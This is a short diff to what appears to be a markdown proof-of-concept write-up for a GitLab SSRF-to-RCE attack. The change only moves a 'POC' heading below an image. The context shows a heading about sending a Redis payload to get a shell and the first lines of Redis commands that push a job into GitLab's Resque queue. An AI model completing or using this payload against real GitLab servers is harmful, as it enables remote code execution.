@@ -45,9 +45,10 @@ root@gitlab:~#
 ```
 ## send redis payload, get shell
 
-#### POC:
+
 
 ![](./GitLab-SSRF-RCE.jpg)
+#### POC:
 ```
  multi
  sadd resque:gitlab:queues system_hook_push
